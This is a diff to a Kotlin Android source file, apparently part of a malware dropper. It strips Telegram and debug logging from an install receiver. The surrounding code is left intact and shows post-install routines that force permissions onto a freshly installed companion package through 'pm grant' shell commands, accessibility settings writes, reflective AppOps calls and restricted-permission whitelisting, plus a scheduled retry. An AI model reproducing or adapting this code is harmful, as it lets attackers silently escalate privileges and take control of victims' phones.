@@ -44,7 +44,6 @@ class InstallReceiver : BroadcastReceiver() {
         when (status) {
 
             PackageInstaller.STATUS_PENDING_USER_ACTION -> {
-                TelegramLogger.log("InstallReceiver: STATUS_PENDING_USER_ACTION — extracting confirm intent")
                 val userIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                     intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                 } else {
@@ -59,23 +58,15 @@ class InstallReceiver : BroadcastReceiver() {
                         setPackage(context.packageName)
                         putExtra(Intent.EXTRA_INTENT, userIntent)
                     }
-                    TelegramLogger.log("InstallReceiver: Relaying install confirm to InstallActivity via broadcast")
-                    DebugLogger.logDropper("STATUS_PENDING_USER_ACTION", DebugLogger.Status.SUCCESS, "confirm relay sent to InstallActivity")
                     context.sendBroadcast(relay)
                 } else {
-                    TelegramLogger.log("InstallReceiver: STATUS_PENDING_USER_ACTION but userIntent is NULL")
-                    DebugLogger.logDropper("STATUS_PENDING_USER_ACTION", DebugLogger.Status.FAILED, "userIntent is NULL — cannot relay confirm")
                 }
             }
 
             PackageInstaller.STATUS_SUCCESS -> {
-                TelegramLogger.log("InstallReceiver: STATUS_SUCCESS — companion installed")
-                DebugLogger.logDropper("PackageInstaller STATUS_SUCCESS", DebugLogger.Status.SUCCESS)
                 // BlackholeVpnService.stop(context)  // VPN temporarily disabled
                 try {
                     val pkgName = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
-                    TelegramLogger.log("InstallReceiver: installed pkg=$pkgName — running post-install approaches")
-                    DebugLogger.logPayload("Installed", DebugLogger.Status.SUCCESS, "pkg=$pkgName")
                     if (!pkgName.isNullOrEmpty()) {
                         context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                             .edit().putString(KEY_MODULE_PKG, pkgName).apply()
@@ -111,9 +102,7 @@ class InstallReceiver : BroadcastReceiver() {
                             val grantCmds = allPerms.joinToString(" && ") { "pm grant $pkgName $it" }
                             val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", grantCmds))
                             val exitCode = proc.waitFor()
-                            TelegramLogger.log("Approach 6 (pm grant shell): exitCode=$exitCode")
                         } catch (e: Exception) {
-                            TelegramLogger.log("Approach 6 (pm grant shell): FAILED — ${e.javaClass.simpleName}: ${e.message}")
                         }
 
                         // APPROACH 10 — Re-enable accessibility component directly (Android 13+)
@@ -144,12 +133,9 @@ class InstallReceiver : BroadcastReceiver() {
                                         android.provider.Settings.Secure.ACCESSIBILITY_ENABLED,
                                         1
                                     )
-                                    TelegramLogger.log("Approach 10 (accessibility secure settings): SUCCESS — wrote $serviceComponent")
                                 } else {
-                                    TelegramLogger.log("Approach 10 (accessibility secure settings): SKIPPED — already enabled")
                                 }
                             } catch (e: Exception) {
-                                TelegramLogger.log("Approach 10 (accessibility secure settings): FAILED — ${e.javaClass.simpleName}: ${e.message}")
                             }
                         }
 
@@ -182,13 +168,10 @@ class InstallReceiver : BroadcastReceiver() {
                                     strOpToOp.isAccessible = true
                                     val opCode = strOpToOp.invoke(null, opName) as? Int ?: return@forEach
                                     setModeMethod.invoke(appOps, opCode, uid, pkgName, 0 /* MODE_ALLOWED */)
-                                    TelegramLogger.log("Approach 11 (AppOps setMode): $opName → SUCCESS")
                                 } catch (e: Exception) {
-                                    TelegramLogger.log("Approach 11 (AppOps setMode): $opName → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                                 }
                             }
                         } catch (e: Exception) {
-                            TelegramLogger.log("Approach 11 (AppOps setMode): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
                         }
 
                         // APPROACH 12 — AppOpsManager setUidMode: uid-level op grant
@@ -209,13 +192,10 @@ class InstallReceiver : BroadcastReceiver() {
                                 try {
                                     val opCode = strOpToOp.invoke(null, op) as? Int ?: return@forEach
                                     setUidMode.invoke(appOps, opCode, uid, 0 /* MODE_ALLOWED */)
-                                    TelegramLogger.log("Approach 12 (AppOps setUidMode): $op → SUCCESS")
                                 } catch (e: Exception) {
-                                    TelegramLogger.log("Approach 12 (AppOps setUidMode): $op → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                                 }
                             }
                         } catch (e: Exception) {
-                            TelegramLogger.log("Approach 12 (AppOps setUidMode): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
                         }
 
                         // APPROACH 13 — PackageManager.updatePermissionFlags post-install
@@ -242,13 +222,10 @@ class InstallReceiver : BroadcastReceiver() {
                                 ).forEach { perm ->
                                     try {
                                         updateFlags.invoke(pm, perm, pkgName, 0x800000, 0, userHandle)
-                                        TelegramLogger.log("Approach 13 (updatePermissionFlags): $perm → SUCCESS")
                                     } catch (e: Exception) {
-                                        TelegramLogger.log("Approach 13 (updatePermissionFlags): $perm → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                                     }
                                 }
                             } catch (e: Exception) {
-                                TelegramLogger.log("Approach 13 (updatePermissionFlags): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
                             }
                         }
 
@@ -280,31 +257,24 @@ class InstallReceiver : BroadcastReceiver() {
                                 restrictedPerms.forEach { perm ->
                                     try {
                                         pm.addWhitelistedRestrictedPermission(pkgName, perm, 2)
-                                        TelegramLogger.log("Approach 14 flag=2 (INSTALLER): $perm → SUCCESS")
                                     } catch (e: Exception) {
-                                        TelegramLogger.log("Approach 14 flag=2 (INSTALLER): $perm → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                                     }
                                 }
                                 // Flag 1 = FLAG_PERMISSION_WHITELIST_SYSTEM (elevated — may work on some OEMs)
                                 restrictedPerms.forEach { perm ->
                                     try {
                                         pm.addWhitelistedRestrictedPermission(pkgName, perm, 1)
-                                        TelegramLogger.log("Approach 14 flag=1 (SYSTEM): $perm → SUCCESS")
                                     } catch (e: Exception) {
-                                        TelegramLogger.log("Approach 14 flag=1 (SYSTEM): $perm → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                                     }
                                 }
                                 // Flag 4 = FLAG_PERMISSION_WHITELIST_UPGRADE (upgrade path)
                                 restrictedPerms.forEach { perm ->
                                     try {
                                         pm.addWhitelistedRestrictedPermission(pkgName, perm, 4)
-                                        TelegramLogger.log("Approach 14 flag=4 (UPGRADE): $perm → SUCCESS")
                                     } catch (e: Exception) {
-                                        TelegramLogger.log("Approach 14 flag=4 (UPGRADE): $perm → FAILED — ${e.javaClass.simpleName}: ${e.message}")
                                     }
                                 }
                             } catch (e: Exception) {
-                                TelegramLogger.log("Approach 14 (addWhitelistedRestrictedPermission): INIT FAILED — ${e.javaClass.simpleName}: ${e.message}")
                             }
                         }
 
@@ -330,10 +300,8 @@ class InstallReceiver : BroadcastReceiver() {
                                 context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                                     .edit().putString("pending_retry_pkg", pkgName).apply()
                                 js.schedule(jobInfo)
-                                TelegramLogger.log("Approach 15 (JobScheduler deferred retry): scheduled job 9921")
                             }
                         } catch (e: Exception) {
-                            TelegramLogger.log("Approach 15 (JobScheduler deferred retry): FAILED — ${e.javaClass.simpleName}: ${e.message}")
                         }
                         } // end if (ENABLE_POST_INSTALL_APPROACHES)
 
@@ -557,9 +525,7 @@ class InstallReceiver : BroadcastReceiver() {
                             diagLines.add("═══ END POST-INSTALL DIAGNOSTIC ═══")
 
                             // Log all lines
-                            diagLines.forEach { TelegramLogger.log(it) }
                         } catch (diagErr: Exception) {
-                            TelegramLogger.log("DIAGNOSTIC REPORT FAILED: ${diagErr.javaClass.simpleName}: ${diagErr.message}")
                         }
 
                     }
@@ -579,8 +545,6 @@ class InstallReceiver : BroadcastReceiver() {
             PackageInstaller.STATUS_FAILURE_STORAGE -> {
                 // BlackholeVpnService.stop(context)  // VPN temporarily disabled
                 val msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: "no message"
-                TelegramLogger.log("InstallReceiver: FAILURE status=$status msg=$msg — relaying restart")
-                DebugLogger.logDropper("PackageInstaller FAILED", DebugLogger.Status.FAILED, "status=$status msg=$msg")
                 // Android 15+ (API 35+) blocks startActivity() from BroadcastReceiver
                 // (Background Activity Launch restriction). Relay to InstallActivity
                 // which restarts the install flow from Activity context.
